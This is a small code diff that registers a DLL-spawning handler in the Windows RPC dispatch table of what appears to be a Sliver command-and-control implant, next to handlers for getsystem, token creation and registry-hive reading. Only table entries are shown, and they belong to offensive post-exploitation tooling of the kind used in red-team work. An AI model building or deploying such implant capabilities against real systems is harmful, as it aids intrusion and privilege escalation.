@@ -1144,6 +1144,7 @@ static const rpc_entry_t g_handlers[] = {
 #if defined(_WIN32)
         {64, 65, handle_make_token},
     {32, 33, handle_getsystem},
+    {40, 41, handle_spawn_dll},
     {133, 133, handle_reg_read_hive},
     {130, 130, handle_services},
     {131, 131, handle_service_detail},
@@ -1217,6 +1218,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
